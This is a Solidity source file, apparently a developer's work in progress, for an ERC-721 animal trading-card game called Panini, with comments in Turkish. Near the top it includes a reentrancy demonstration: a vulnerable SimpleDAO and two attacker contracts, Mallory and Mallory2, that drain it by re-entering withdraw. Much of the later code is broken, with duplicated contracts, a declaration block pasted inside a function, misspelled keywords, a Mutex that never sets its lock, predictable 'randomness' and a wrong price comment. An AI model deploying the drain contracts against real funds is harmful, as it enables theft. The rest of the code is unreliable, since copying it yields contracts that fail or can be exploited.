pragma solidity ^0.4.21;

//import "github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC721/ERC721Token.sol";
//not: yukaridaki token ozelliklerini kod icerisinde sagliyoruz. Bu yuzden basic gas verimi icin tercih edildi.
import "github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC721/ERC721BasicToken.sol";

//randomize icin gerekli olacak.
//import "github.com/oraclize/ethereum-api/oraclizeAPI.sol";

//Panini ERC721Token
contract PaniniERC721Token is ERC721BasicToken {
 
    // Token name
    string internal name_;
    
    // Token symbol
    string internal symbol_;

    function PaniniERC721Token() public {
        name_ = "Panini Token";
        symbol_ = "Panini Symbol";
    }
    
    function name() public view returns (string) {
        return name_;
    }
    
    function symbol() public view returns (string) {
        return symbol_;
    }
    
}

contract PaniniERC721TokenOfContract is PaniniERC721Token {
 
    function mint(address _to, uint256 _cardId) public{
        super._mint(_to, _cardId);
    }
    
}

contract paniniTokenTest {
    PaniniERC721TokenOfContract nft;
    uint256 nextTokenId;
    
    function paniniTokenTest() public {
        //nft = new PaniniERC721Token();
    }
    
    function mint() public{
        nextTokenId = nextTokenId + 1;
      
        nft.mint(this, nextTokenId);
    }
    
    
    function balanceOf(address _owner) public view returns (uint256) {
        return nft.balanceOf(_owner);
    }

    function ownerOf(uint256 _cardId) public view returns (address) {
        return nft.ownerOf(_cardId);   
    }
  
    function exists(uint256 _cardId) public view returns (bool) {
        return nft.exists(_cardId);
    }

    function approve(address _to, uint256 _cardId) public {
        nft.approve(_to, _cardId);
    }

    function getApproved(uint256 _cardId) public view returns (address) {
        return nft.getApproved(_cardId);
    }

    function setApprovalForAll(address _to, bool _approved) public {
        nft.setApprovalForAll(_to, _approved);
    }

    function isApprovedForAll(address _owner, address _operator) public view returns (bool) {
        return nft.isApprovedForAll(_owner, _operator);
    }

    function transferFrom(address _from, address _to, uint256 _cardId) public {
        return nft.transferFrom(_from, _to, _cardId);
    }
    
    function safeTransferFrom(address _from, address _to, uint256 _cardId) public {
        nft.safeTransferFrom(_from, _to, _cardId, "");
    }

    
}


pragma solidity ^0.4.2;

contract SimpleDAO {   
  mapping (address => uint) public credit;
  uint public bal;
    
  function donate(address to) payable {
    credit[to] += msg.value;
    bal = address(this).balance;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
      bal = address(this).balance;
    }
  }  

  function queryCredit(address to) returns (uint){
    return credit[to];
  }
}


contract Mallory {
  SimpleDAO public dao;
  address owner;
    uint public bal;

  function Mallory(SimpleDAO addr){ 
    owner = msg.sender;
    dao = addr;
  }
  
   function donate(address to) payable {
    bal = address(this).balance;
  }
  
  function setBal() public {
      bal = address(this).balance;
  }
  
  function getJackpot() payable{ 
    bool res = owner.send(address(this).balance); 
  }

  function() payable { 
    dao.withdraw(dao.queryCredit(this)); 
  }
}

contract Mallory2 {
  SimpleDAO public dao;
  address owner; 
  bool public performAttack = true;
  uint public bal;
  
    
  function setBal() public {
      bal = address(this).balance;
  }
  
  function Mallory2(SimpleDAO addr){
    owner = msg.sender;
    dao = addr;
  }
    
  function attack() payable{
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot(){
    dao.withdraw(dao.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}


contract MapTest{
    
    uint[] public arr;    
    mapping(uint => uint) public hash;

    function addElem(uint key, uint val) public {
        hash[key] = val;    
    }
    
    function deleteElem(uint key) public {
        hash[key] = 0;    
    }

    function deleteElem1(uint key) public {
        delete hash[key];    
    }

}

//save.
pragma solidity ^0.4.21;

//import "github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC721/ERC721Token.sol";
//not: yukaridaki token ozelliklerini kod icerisinde sagliyoruz. Bu yuzden basic gas verimi icin tercih edildi.
import "github.com/OpenZeppelin/zeppelin-solidity/contracts/token/ERC721/ERC721BasicToken.sol";

//randomize icin gerekli olacak.
//import "github.com/oraclize/ethereum-api/oraclizeAPI.sol";

//Panini ERC721Token
contract PaniniERC721Token is ERC721BasicToken {
 
    // Token name
    string internal name_;
    
    // Token symbol
    string internal symbol_;

    function PaniniERC721Token() public {
        name_ = "Panini Token";
        symbol_ = "Panini Symbol";
    }
    
    function name() public view returns (string) {
        return name_;
    }
    
    function symbol() public view returns (string) {
        return symbol_;
    }
    
}

//this test failed.
//   msg.sender = paniniTokenTest.address
//   thus, in approve method, require(msg.sender == owner) returns false
//      owner: owner of token  
//we can use this pattern in market. (cryptoKitties uses for auctions.)
contract paniniTokenTest {
    //PaniniERC721Token nft;
    uint256 nextTokenId;
    
    function paniniTokenTest() public {
        //nft = new PaniniERC721Token();
    }
    
    function mint() public{
        nextTokenId = nextTokenId + 1;
      
        //nft.mint(msg.sender, nextTokenId);
    }
    
}
//true usage:
contract paniniTokenTest2 is PaniniERC721Token{
    uint256 nextTokenId;
    function mint() public{
        nextTokenId = nextTokenId + 1;
        super._mint(msg.sender, nextTokenId);
    }
 
}

//#########################################
//###    PANINI OWNERS - CONTROLLER     ###
//#########################################

contract PaniniOwner{
    address private owner;
    address public pendingOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function PaniniOwner() public {
        owner = msg.sender;
    }

    modifier __onlyPendingOwner() {
        require(msg.sender == pendingOwner);
        _;
    }

    function isOwner() view internal returns(bool res){
        if(msg.sender == owner) {
            res = true;
        }
    }

    modifier __onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) __onlyOwner public {
        pendingOwner = newOwner;
    }

    function claimOwnership() __onlyPendingOwner public {
        emit OwnershipTransferred(owner, pendingOwner);
        owner = pendingOwner;
        pendingOwner = address(0);
    }

    function kill() {
        if (msg.sender == owner) selfdestruct(owner);
    }
}


library Role {

    enum RoleType {
        CEO,
        CFO,
        COO
    }

    struct Data {
        RoleType roleType;
        bool active;
        string createdTime; //Date olabilir sonra
    }

}

contract UsingRole{
    using Role for Role.Data;

}


/**
 * The paniniDevAccount contract does this and that...
 */
contract PaniniDevAccounts is PaniniOwner, UsingRole {
    
    mapping(address => Role.Data) public devAccounts;

    event DevAccountRoleAdded(address _address);
    event DevAccountRoleRemoved(address _address);
    
    function PaniniDevAccounts() public {
        
    }    

    function addDevAccount(address _address, Role.RoleType _roleType, bool _active) internal returns(bool success) {
        if( devAccounts[_address].active == false ) {            
            devAccounts[_address].active = _active;
            devAccounts[_address].roleType = _roleType;
            devAccounts[_address].createdTime = "created Time";
            emit DevAccountRoleAdded(_address); //event'e role eklenebilir mi acaba?
            success = true;
        }
    }

    function addDevAccountToCEO (address _address, bool _active) __onlyOwner internal returns(bool success) {
        success = addDevAccount(_address, Role.RoleType.CEO, _active);     
    }

    function addDevAccountToCFO (address _address, bool _active) __onlyOwner internal returns(bool success) {
        success = addDevAccount(_address, Role.RoleType.CFO, _active);     
    }

    function addDevAccountToCOO (address _address, bool _active) __onlyOwner internal returns(bool success) {
        success = addDevAccount(_address, Role.RoleType.COO, _active);     
    }
    
    function removeDevAccount(address _address) __onlyOwner public returns(bool success) {
        if( devAccounts[_address].active == true ) {            
            devAccounts[_address].active = false;
            delete devAccounts[_address];
            emit DevAccountRoleRemoved(_address); //event'e role eklenebilir mi acaba?
            success = true;
        }
    }
   
    modifier __onlyCEO() {

        require(devAccounts[msg.sender].active == true);        
        require(devAccounts[msg.sender].roleType == Role.RoleType.CEO);
        _;
    }

    modifier __onlyCFO() {

        require(devAccounts[msg.sender].active == true);        
        require(devAccounts[msg.sender].roleType == Role.RoleType.CFO);
        _;
    }

    modifier __onlyCOO() {

        require(devAccounts[msg.sender].active == true);        
        require(devAccounts[msg.sender].roleType == Role.RoleType.COO);
        _;
    }

    /* err in usage.
    modifier __OnlyForThisRoles(bool _withOwner, Role.RoleType[] _roles) {
        bool result = false;
        if(_withOwner && isOwner()) {
            result = true;
        }
        if(devAccounts[msg.sender].active == true) {
            for(uint256 i = 0; i < _roles.length; i++) {
                if( devAccounts[msg.sender].roleType == _role[i]) {
                    result = true;                                
                }
            }
        }
        require (result == true);        
        _;
    }*/

    modifier __OnlyForThisRoles1(bool _withOwner, Role.RoleType _role1 ) {
        bool result = false;
        if(_withOwner && isOwner()) {
            result = true;
        }
        if(devAccounts[msg.sender].active == true && devAccounts[msg.sender].roleType == _role1 ) {
            result = true;            
        }
        require (result == true);        
        _;
    }

    modifier __OnlyForThisRoles2(bool _withOwner, Role.RoleType _role1, Role.RoleType _role2 ) {
        bool result = false;
        if(_withOwner && isOwner()) {
            result = true;
        }
        if(devAccounts[msg.sender].active == true) {
            if( devAccounts[msg.sender].roleType == _role1 
                || devAccounts[msg.sender].roleType == _role2) {
                result = true;            
            }
        }
        require (result == true);        
        _;
    }

    modifier __OnlyForThisRoles3(bool _withOwner, Role.RoleType _role1, Role.RoleType _role2, Role.RoleType _role3 ) {
        bool result = false;
        if(_withOwner && isOwner()) {
            result = true;
        }
        if(devAccounts[msg.sender].active == true) {
            if( devAccounts[msg.sender].roleType == _role1 
                || devAccounts[msg.sender].roleType == _role2                 
                || devAccounts[msg.sender].roleType == _role3) {
                result = true;            
            }
        }
        require (result == true);        
        _;
    }

}


library PaniniState {

    struct Data {
        bool paused;
        bool presaled;
    }

    function pause(PaniniState.Data self) pure internal {
        self.paused = true;
    }

    function unPause(PaniniState.Data self) pure internal {
        self.paused = false;
    }

    function presale(PaniniState.Data self) pure internal {
        self.presaled = true;
    }

    function unPresale(PaniniState.Data self) pure internal {
        self.presaled = false;
    }

}

contract UsingPaniniState{
    using PaniniState for PaniniState.Data;

}

contract Mutex {
    mapping (address => bool) mutex;
    
    function enter() returns() public {
        if ( mutex[msg.sender] == true) { throw; }
        mutex[msg.sender] == true;
    }

    function left() returns() public {
        //false yapmak da yeterli mi?
        delete mutex[msg.sender];
    }
    
}


library Shareholder {

    struct Data {
        address owner;
        uint256 percentage;        
        uint256 balance;
    }

}

contract UsingShareholder {

    using Shareholder for Shareholder.Data;

    event WithdrawOwnerBalance(address credit, uint256 amount);
    event WithdrawShareholderBalance(address credit, uint256 amount);
    mapping (address => Shareholder.Data) shareholders;
    address[] shareholderAddressList;
    mapping (address => address) pendingShareholders;

    event ShareholderOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 totalPercentage;
    uint256 ownerBalance;

    //for security
    Mutex mutex;

    modifier __isOnlyOwnerOfShareholder() {
        require(shareholders[msg.sender].owner != msg.sender);
        _;
    }

    function UsingShareholder() public {
        initShareHolders();
    }

    function initShareHolders() internal {
        // ilk hesaplar.   
        address shareholderAddress1 = address(0xdd870fa1b7c4700f2bd7f44238821c26f7392148);
        addShareHolder(shareholderAddress1, 20);
        address shareholderAddress2 = address(0x583031d1113ad414f02576bd6afabfb302140225);
        addShareHolder(shareholderAddress2, 10);
    }

    function isShareHolder(address _address) internal returns(bool) {
        if(shareholders[_address].owner != _address) {
            return true;
        }
        return false;
    }

    function addShareHolder(address _address, uint256 _percentage) internal {
        
        require (isShareHolder(_address) == false);

        uint nextTotalPercentage = totalPercentage + _percentage;
        if(nextTotalPercentage <= 100) {
            shareholders[_address] = Shareholder.Data(_address, _percentage, 0);
            totalPercentage = nextTotalPercentage;
            
        }                            
    }
    
    //dealBalance
    function dealBalance(uint256 _amount) internal{
        if(_amount != 0) {

            uint256 amount = _amount;
            uint256 onePercentOfAmount = amount / 100;
            
            for(uint256 i = 1; i < shareholders.length; i++) {

                uint percentage = shareholders[i];
                uint addBalance = percentage * onePercentOfAmount;
                
                Shareholders[i].balance += addBalance;
                amount -= addBalance;
            }        

            //note: hic bir zaman total percente 100'u gecmeyecegi icin,
            // amount for dongusu sonunda pozitif olacaktir.
            // kontrolu addShareHolder'da yapilmisti.
            ownerBalance += amount;
        }                
    }
    
    function withdrawShareholderBalance() __isOnlyOwnerOfShareholder public payable {
        mutex.enter();
        uint256 id = shareHoldersIndex[msg.sender];
        uint256 balance = shareholders[id].balance;
        shareholders[id].balance = 0;
        if(!msg.sender.call.value(balance)()) { throw;}
        emit WithdrawShareholderBalance(msg.sender, balance);
        mutex.left();        
    }
    
    function withdrawOwnerBalance() internal payable {
        mutex.enter();
        uint256 balance = ownerBalance;
        ownerBalance = 0;
        if(!msg.sender.call.value(balance)()) { throw;}
        emit WithdrawOwnerBalance(msg.sender, balance);
        mutex.left();        
    }

    function transferShareholderOwnership(address _newOwner) __isOnlyOwnerOfShareholder public {        
        require (msg.sender != _newOwner);  
        pendingShareholdersIndex[_newOwner] = pendingShareholders.length;
        pendingShareholders.push(_newOwner);
        pendingShareholdersToOwner[_newOwner] = msg.sender;
    }

    function claimShareholderOwnership() public {
        uint256 index = pendingShareholdersIndex[msg.sender];
        address pendingOwner = pendingShareholders[index];
        if(pendingOwner == msg.sender && pendingOwner != address(0)) {
            uint256 owner = pendingShareholdersToOwner[msg.sender];
            uint256 ownerId = shareHoldersIndex[owner];                

            //delete all data about pending owner
            delete pendingShareholdersIndex[msg.sender];
            delete pendingShareholders[index];                      
            delete pendingShareholdersToOwner[msg.sender]; 

            //pendingOwner is has another acc.
            if(isShareHolder(pendingOwner)) {
                //balance add.
                //percentage add.
                uint256 pendingId = shareHoldersIndex[msg.sender];
                
                shareholders[pendingId].balance += shareholders[ownerId].balance;               
                shareholders[pendingId].percentage += shareholders[ownerId].percentage;

                //delete old acc.
                delete shareHoldersIndex[owner];
                delete shareholders[ownerId];
            } else {
                //owner vs degistir.
    Shareholder.Data[] shareholders;
    mapping (address => uint256) shareHoldersIndex;
    address[] pendingShareholders;
    mapping (address => uint256) pendingShareholdersIndex;
    mapping (address => address) pendingShareholdersToOwner;



            }
            
            emit ShareholderOwnershipTransferred(owner, pendingOwner);
        }
    }


    function () public payeble {
        
    }
    
}


contract PaniniController is PaniniDevAccounts, UsingPaniniState, UsingShareholder {
    event Pause();
    event UnPause();
    event Presaled();
    event UnPresaled();

    PaniniState.Data private paniniState;
    function PaniniController() public {
        //initial state.
        // starts with paused
        paniniState = PaniniState.Data(true, true);        
        mutex = new Mutex();
    }
    
    modifier __whenNotPaused() {
        require(!paniniState.paused);
        _;
    }

    modifier __whenPaused {
        require(paniniState.paused);
        _;
    }

    modifier __whenNotPresaled() {
        require(!paniniState.presaled);
        _;
    }

    modifier __whenPresaled {
        require(paniniState.presaled);
        _;
    }

    function pause() __OnlyForThisRoles1(true, Role.RoleType.CEO) public returns (bool success) {
        if(!paniniState.paused) {
            paniniState.pause();
            emit Pause();
            success = true;            
        }
    }

    function unPause() __OnlyForThisRoles1(true, Role.RoleType.CEO) public returns (bool success) {
        if(paniniState.paused) {
            paniniState.unPause();
            emit UnPause();
            success = true;
        }
    }

    function presale() __OnlyForThisRoles1(true, Role.RoleType.CEO) public returns (bool success) {
        if(!paniniState.presaled) {
            paniniState.presale();
            emit Presaled();
            success = true;            
        }
    }

    function unPresale() __OnlyForThisRoles1(true, Role.RoleType.CEO) public returns (bool success) {
        if(paniniState.presaled) {
            paniniState.unPresale();
            emit UnPresale();
            success = true;
        }
    }

    function withdrawBalance() __OnlyForThisRoles1(true, Role.RoleType.CFO) public payeble returns (bool success) {
        withdrawOwnerBalance();
    }

}



//#########################################
//###               CARDS               ###
//#########################################

library AnimalCardBase {
    
    enum Region {
        ASIA,
        AFRICA,
        NOURTH_AMERICA,
        SOUTH_AMERICA,
        ANTARCTICA,
        EUROPE,
        AUSTRALIA,
        OCEAN
    }
   
    //data
    struct Data {
        
        //kullanilmayacak, bunun yerine indexler id olacak.
        uint256 id; // arr index: 0: empty initialized and never used.
        string name;
        uint256 health; //life expectancy
        uint256 weigth; //str
        uint256 speed; //dex
        Region region;
        uint256 rarity; // 0-100 arasinda bir sayi. 
    }
    
    //returns clone of base card.
    function clone(AnimalCardBase.Data self) internal pure returns(AnimalCardBase.Data) {
        return AnimalCardBase.Data(self.id, self.name, self.health, self.weigth, self.speed, self.region, self.rarity);
    }


}

//kartlara ozel bazi farkliliklar katilabilir? 
//Mesela ayni tip kart'in ozellikleri random degisebilir %5 gibi?
//price burada tutulabilir bu durumda vs.
library AnimalCard {
    
    //data
    struct Data {
        
        uint256 baseId; // arr index: 0: empty initialized and never used.
        uint256 tokenId; 
        uint256 ownerId; //playerId
    }
}

contract UsingCard is PaniniERC721Token{

    using AnimalCardBase for AnimalCardBase.Data;
    using AnimalCard for AnimalCard.Data;

    // metedata
    AnimalCardBase.Data[] animalCardBase; 

    // created cards: metedata ile token'i bagliyor.
    //Normal token listesinden farki.
    //
    //tokenid(index = tokenId) -> baseid, + tokenid (app'da ise yarayabilir.)
    AnimalCard.Data[] animalCards; 
    //farkli kart tipleri icin uretilen tokenlar
    // baseId -> tokenId list -> index of animalCards 
    mapping(uint256 => uint256[]) tokensOfEachCards;

    //for test
    uint256 random;
    
    function UsingCard() public {
        random = 1;
        initAnimalCardBase();
        AnimalCard.Data memory emptyAnimalCard = AnimalCard.Data(0, 0, 0);        
        animalCards.push(emptyAnimalCard);
    }
    
    function initAnimalCardBase() internal {
        //id'lerin indexler ile ayni olmasi icin eklendi. Kullanilmayacak. bunun id'si 0.
        createAnimalCardBase('empty', 0, 0, 0, AnimalCardBase.Region.AFRICA, 0 );        
        
        createAnimalCardBase('fil', 1000, 3000, 60, AnimalCardBase.Region.AFRICA, 14 );        
        createAnimalCardBase('at', 400, 500, 90, AnimalCardBase.Region.ASIA, 22 );        
        createAnimalCardBase('tavsan', 20, 2, 80, AnimalCardBase.Region.EUROPE, 55 );        
        createAnimalCardBase('aslan', 200, 200, 80, AnimalCardBase.Region.AFRICA, 21 );        

        createAnimalCardBase('balina', 10000, 30000, 40, AnimalCardBase.Region.OCEAN, 14 );        
        createAnimalCardBase('yunus', 1000, 300, 80, AnimalCardBase.Region.OCEAN, 25 );        
        createAnimalCardBase('kilic baligi', 100, 40, 140, AnimalCardBase.Region.OCEAN, 5 );        

        createAnimalCardBase('kartal', 100, 15, 100, AnimalCardBase.Region.ASIA, 25 );        
        createAnimalCardBase('guvercin', 10, 1, 30, AnimalCardBase.Region.SOUTH_AMERICA, 24 );        

        createAnimalCardBase('karinca', 1, 1, 1, AnimalCardBase.Region.EUROPE, 43 );        

    }
    
    // usuable id between 1 to (n-1)
    function existAnimalCardBase(uint256 _baseId ) public view returns(bool) {
        if( _baseId > 0 && _baseId <= animalCardBase.length) {
            return true;
        }
        return false;                
    }
    
    //usuable card id starts with 1.
    function createAnimalCardBase(string _name, uint256 _health, uint256 _weigth, uint256 _speed, AnimalCardBase.Region _region, uint256 _rarity ) internal{
        uint256 id = animalCardBase.length;
        animalCardBase.push(AnimalCardBase.Data(id, _name, _health, _weigth, _speed, _region, _rarity));
    }
    
    //returns index of animalCardBase
    function generateRandomCardId() internal view returns (uint256) {
        //private test for random
        uint256 id = random;
        uint256 delta = animalCardBase.length -1;
        require(delta > 0);

        id =( ( ( id + 2 ) * ( 3 * id + 2 ) ) % delta ) + 1;

        return id;

        // random'u nasil yapacagiz buna karar verilecek.
        //kartlar eklenirken bir islem yapilacak. random card genereate ederken secim buna gore. bir array'den index cikartilacak.
    }
    
    function exists(uint256 _cardId) public view returns (bool) {
        return super.exists(_cardId);
    }

    function ownerOf(uint256 _cardId ) public view returns(address) {
        return super.ownerOf(_cardId);
    }
    //cart üretilmesi için.
    //token kullanacak.
    //to: token icin. 
    //baseId: random generated value of basecard index. 
    function mintCardWithBaseId(address _to, uint256 _baseId) internal returns(uint256){

        uint256 tokenId = animalCards.length;
        super._mint(_to, tokenId);
        // set baseId of metedata
        AnimalCard.Data memory animalCard = AnimalCard.Data(_baseId, tokenId, 0);        
        animalCards.push(animalCard); 
        tokensOfEachCards[_baseId].push(tokenId);
        return tokenId;
    }
    
    function getAnimalCardBase(uint256 _baseId) internal view returns(AnimalCardBase.Data) {
        return animalCardBase[_baseId].clone();
    }
            
}


library CardPackage {

    struct Data {
        uint256 id;
        address owner;
        uint256 card1;        
        uint256 card2;        
        uint256 card3;        
        uint256 card4;        
        uint256 card5;     
        //created date vs eklenebilir.   
    }

    struct Prices{
        uint256 normal;
        uint256 initial;
        uint256 special;
    }
        
}


contract UsingCardPackage is UsingCard {
    using CardPackage for CardPackage.Data;
    uint256 numberOfPackageCreated;

    //package gecmisi tutulacak mi?    
    CardPackage.Prices prices;
    //ozel gunler?
    mapping (uint256 => bool) specialDays;    

    //created packages;
    //CardPackage.Data[] createdPackages; 
    //changed to hash
    mapping (uint256 => CardPackage.Data) createdPackages;
    

    //user address -> package id list
    mapping(address => uint256[]) ownerOfPackage;
    //packageId -> address of package list index
    mapping(uint256 => uint256) ownerOfPackageIndex;


    function UsingCardPackage() public {
        //id = 0 icin empty package
        //createdPackages.push(CardPackage.Data(0, address(0), 0,0,0,0,0));
        prices.normal = 5000000000000000000; //0.05 ether
        prices.initial = 1000000000000000000; //0.01 ether
        prices.special = 3000000000000000000; //0.03 ether
        //TO DO: set special days.
    }
    
    function createPackage(address _address) public payable {
        numberOfPackageCreated += 1; //ayni zamanda package id.
        uint256 packageId = numberOfPackageCreated;
        
        uint256 newIndex = ownerOfPackage[_address].length;
        ownerOfPackageIndex[packageId] = newIndex;
        ownerOfPackage[_address][newIndex] = packageId;

        //generating cards
        //card1
        uint256 baseId1 = generateRandomCardId();
        uint256 tokenId1 = mintCardWithBaseId(_address, baseId1);
        //card2
        uint256 baseId2 = generateRandomCardId();
        uint256 tokenId2 = mintCardWithBaseId(_address, baseId2);
        //card3
        uint256 baseId3 = generateRandomCardId();
        uint256 tokenId3 = mintCardWithBaseId(_address, baseId3);
        //card4
        uint256 baseId4 = generateRandomCardId();
        uint256 tokenId4 = mintCardWithBaseId(_address, baseId4);
        //card5
        uint256 baseId5 = generateRandomCardId();
        uint256 tokenId5 = mintCardWithBaseId(_address, baseId5);

        createdPackages[packageId] = CardPackage.Data(packageId, _address, tokenId1, tokenId2, tokenId3, tokenId4, tokenId5);

    }

    function packageExists(uint256 _packageId) public returns(bool packageExists) {        
        if(createdPackages[_packageId].id != 0) {
            packageExists = true;
        }
    }

    function isOwnerOfPackage(uint256 _packageId) public returns(bool isOwner) {
        if(packageExists(_packageId)) {
            if(msg.sender == createdPackages[_packageId].owner) {
                isOwner = true;
            }
        }
    }

    function removePackage(uint256 _packageId) internal { 
        if(isOwnerOfPackage(_packageId)) { 
        // ownerOfPackage[msg.sender].length must be greater then 0

            //delete from ownerOfPackage
            //get indexes and id
            uint256 index = ownerOfPackageIndex[_packageId];//1
            uint256 lastIndex = ownerOfPackage[msg.sender].length - 1;//6
            uint256 lastPackageId = ownerOfPackage[msg.sender][lastIndex];//4, _packageId:2
            //move package id in owner arr
            ownerOfPackage[msg.sender][index] = lastPackageId; // arr[1] = 4
            ownerOfPackage[msg.sender][lastIndex] = 0; // arr[6] = 0
            ownerOfPackage[msg.sender].length--; // length--
            //move index in hash.
            ownerOfPackageIndex[_packageId] = 0; // hash[2] = 0
            ownerOfPackageIndex[lastPackageId] = index; //hash[4] = 1

            //gerek yok. 
            // sebep1: id'ler autoinc.
            // sebep2: createdPackages hash'te tutabiliriz?
            // sebep3: gecmise alinan ait paketleri goruntuleme olabilir?

            //delete from createdPackages
            //last index'teki paket tasinmali.
            //paketid'ler index bu sefer.
            //uint256 id = _packageId; //2
            //uint256 lastId = createdPackages.length -1; //6
            //address lastIdOwner = createdPackages[lastId].owner;
            //set last ownerOfPackage && ownerOfPackageIndex
            //lastIndex = ownerOfPackageIndex[lastId]; // 1
            //ownerOfPackage[lastIdOwner][lastIndex] = id; // arr[1] = 2
            //ownerOfPackageIndex[lastId] = 0; // hash[6] = 0
            //ownerOfPackageIndex[id] = lastIndex; // hash[2] = 1
            //move last packate in createdPackages arr
            //CardPackage.Data lastPackage = createdPackages[lastId];
            //lastPackage.id = id;
            //createdPackages[id] = lastPackage;
            //delete createdPackages[lastId];
            delete createdPackages[_packageId];

        }
    }
    

    //fiyatlar sonradan degistirilemesin?
    function computePriceOfPackage(uint _numberOfPackage) public returns(uint256 price) {
         //initial price
        if(numberOfPackageCreated <= 100) {
            uint remaining = 100 - numberOfPackageCreated;
            if(_numberOfPackage < remaining) {
                //TO DO: check owerflow?
                price = _numberOfPackage * prices.initial;
            } else {
                price = (remaining * prices.initial) + ((_numberOfPackage - remaining) * prices.normal);
            } 
        } 
        //TO DO: ozel gun ise fiyat belirle
        //else if .. {}

        //normal price
        else {
            price = _numberOfPackage * prices.normal;
        }
    }
    
}



//#########################################
//###             GAMECORE              ###
//#########################################

library GameCore {

    struct Data {
  
    }
  
}

contract UsingGameCore is , PaniniController {
    using GameCore for GameCore.Data;

}




//#########################################
//###            PLAYERS                ###
//#########################################
library Player {

    struct Data {
        uint256 id; // adress olabilir, yada id kalsın. bakarız.
        string name;
        uint256 numberOfStars;
        //baseId -> cardIndex-tokenId
        mapping(uint256 => uint256[]) animalCards;
        //cardId -> index of animalCards[baseId]
        mapping(uint256 => uint256) animalCardsIndex;    
    }
    
    function hasCard(Data storage self, uint256 _baseId ) public view returns(bool) {
        if(self.animalCards[_baseId].length == 0) {
            return false;
        }
        return true;                
    }
    

    function addCard(Data storage self, uint256 _baseId, uint256 _cardId) internal {
        uint256 cardId = _cardId;
        self.animalCardsIndex[cardId] = self.animalCards[_baseId].length;
        self.animalCards[_baseId].push(cardId); 
    }

    function removeCard(Data storage self, uint256 _baseId, uint256 _cardId) internal {
        if(hasCard(self, _baseId)) {        
            uint256 cardIndex = self.animalCardsIndex[_cardId];
            //TODO CONTROL lValue is not (0 -1)
            uint256 lastCardIndex = self.animalCards[_baseId].length - 1;
            uint256 lastCard = self.animalCards[_baseId][lastCardIndex];

            self.animalCards[_baseId][cardIndex] = lastCard;
            self.animalCards[_baseId][lastCardIndex] = 0;

            self.animalCards[_baseId].length--;
            self.animalCardsIndex[_cardId] = 0;
            self.animalCardsIndex[lastCard] = cardIndex;

        }
    }
    
}


contract UsingPlayer is UsingGameCore{
    using Player for Player.Data;
    mapping (address => Player.Data) players;
    mapping (uint256 => address) playerIdToAddress;
    
    uint256 numberOfPlayer;
    
    function UsingPlayer() public {
        numberOfPlayer = 0;
    }
    
    modifier __isPlayer {
        require(players[msg.sender].id != 0);
        _;
    }

    function isPlayer(address _address) internal view{
        require(players[_address].id != 0);
    }

    function register(string _name) public {
        require(players[msg.sender].id == 0);
        numberOfPlayer = numberOfPlayer + 1;
        players[msg.sender].id = numberOfPlayer; 
        players[msg.sender].name = _name;
        //5x card 
        addRandomCardToPlayer(msg.sender);
        addRandomCardToPlayer(msg.sender);
        addRandomCardToPlayer(msg.sender);
        addRandomCardToPlayer(msg.sender);
        addRandomCardToPlayer(msg.sender);
    }    
    
    function getPlayerName() __isPlayer public view returns(string) {
        return players[msg.sender].name;
    }

    function addCardToPlayer(address _address, uint256 _cardId) internal {
        isPlayer(_address);
        if(exists(_cardId)) {
            uint256 baseId = animalCards[_cardId];
            addCardToPlayer(_address, _cardId, baseId);
        }        
    }
    
    function addCardToPlayer(address _address, uint256 _cardId, uint256 _baseId) internal {
        players[_address].addCard(_baseId, _cardId);
        animalCards[_cardId].ownerId = players[_address].id;        
        players[_address].numberOfStars = players[_address].numberOfStars + 1; // simdilik kart sayisi olsun. 
    }

    function addRandomCardToPlayer(address _address) internal {
        isPlayer(_address);
        uint256 baseId = generateRandomCardId();
        //kart'in uretilmesi.
        uint256 cardId = mintCardWithBaseId(_address, baseId);
        addCardToPlayer(_address, cardId, baseId);
    }

    //bu method value degeri girilerek web3 tarafinda cagrilacak.
    public buyPackage(uint256 _numberOfPackage) __isPlayer public payeble {
        mutex.enter();

        uint256 price = computePriceOfPackage(_numberOfPackage);
        require (price < msg.value);
        dealBalance(msg.value);        

        createPackage(msg.sender);

        mutex.left();
    }

    function openPackage(uint256 _packageId) __isPlayer __whenNotPresaled public {
        //paket'i var ise 
        if(isOwnerOfPackage(_packageId)) {
            CardPackage.Data package = createdPackages[_packageId];
            //remove first
            removePackage(_packageId);

            addCardToPlayer(msg.sender, package.card1);
            addCardToPlayer(msg.sender, package.card2);
            addCardToPlayer(msg.sender, package.card3);
            addCardToPlayer(msg.sender, package.card4);
            addCardToPlayer(msg.sender, package.card5);
        }       
    }


    function balanceOf(address _owner) public view returns (uint256) {
        return super.balanceOf(_owner);
    }

    function approve(address _to, uint256 _cardId) public {
        super.approve(_to, _cardId);
    }

    function getApproved(uint256 _cardId) public view returns (address) {
        return super.getApproved(_cardId);
    }

    //TO DO: bazi metodlar disari kapanacak. Bunun disaridan kullanilmasini istemiyoruz mesela.
    function transferFrom(address _from, address _to, uint256 _cardId) public {
        super.transferFrom(_from, _to, _cardId);
    }        

    function safeTransferFrom(address _from, address _to, uint256 _cardId) public {
        safeTransferFrom(_from, _to, _cardId, "");        
    }

    function safeTransferFrom(address _from, address _to, uint256 _cardId, bytes _data) public {
        super.safeTransferFrom(_from, _to, _cardId, _data);
        //cart sahibini degistir.
        animalCards[_cardId].ownerId = players[_to].id;
        //buradaki tasima islemleri.
        // remove card from previous player
        // add card to other player
        uint256 baseId = animalCards[_cardId].baseId;
        uint256 cardId = _cardId;
        players[_from].removeCard(baseId, cardId);
        players[_to].addCard(baseId, cardId);
       
    }


    // name and sayisi
    function getMyCard(uint256 _cardId) __isPlayer public view returns(string, uint256, string) {
        uint256 count = 0;
        string memory name = "";        
        string memory err = "";        
        //kart var mı yani token var mi? : token yok ise baseId = 0 gelecektir.
        uint256 baseId = animalCards[_cardId].baseId;
        if (existAnimalCardBase(baseId)) {
            name = animalCardBase[baseId].name;                    
            //cont = players[msg.sender].hasCard(baseId);
            //kartin sahibi mi?
            if( players[msg.sender].id == animalCards[_cardId].ownerId) {
